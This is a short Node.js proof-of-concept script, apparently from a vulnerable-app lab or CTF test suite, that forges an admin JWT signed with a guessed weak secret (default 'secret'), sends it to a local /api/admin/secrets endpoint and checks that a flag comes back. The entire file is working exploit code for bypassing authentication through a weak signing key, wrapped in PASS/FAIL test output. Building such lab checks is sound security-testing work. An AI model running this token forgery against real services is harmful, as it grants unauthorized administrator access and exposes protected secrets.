#!/usr/bin/env node
/**
 * PoC V1.1 — forge admin JWT with weak secret, read admin_secrets flag.
 * Usage: node forge-jwt.mjs --base http://127.0.0.1:3001 [--secret secret]
 */
import { createHmac } from 'node:crypto';
import { extractFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

function b64url(input) {
  return Buffer.from(input)
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

function forgeJwt(secret, payload) {
  const header = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const body = b64url(JSON.stringify(payload));
  const data = `${header}.${body}`;
  const sig = createHmac('sha256', secret)
    .update(data)
    .digest('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
  return `${data}.${sig}`;
}

const base = arg('base', 'http://127.0.0.1:3001').replace(/\/$/, '');
const secret = arg('secret', 'secret');

const token = forgeJwt(secret, {
  sub: 1,
  username: 'admin',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
});

const res = await fetch(`${base}/api/admin/secrets`, {
  headers: { Authorization: `Bearer ${token}`, Accept: 'application/json' },
});
const text = await res.text();
console.log('status', res.status);
console.log(text);

const flag = extractFlag(text);
if (!flag || res.status !== 200) {
  console.error('FAIL: flag not obtained via forged JWT');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V1.1 forged-JWT');
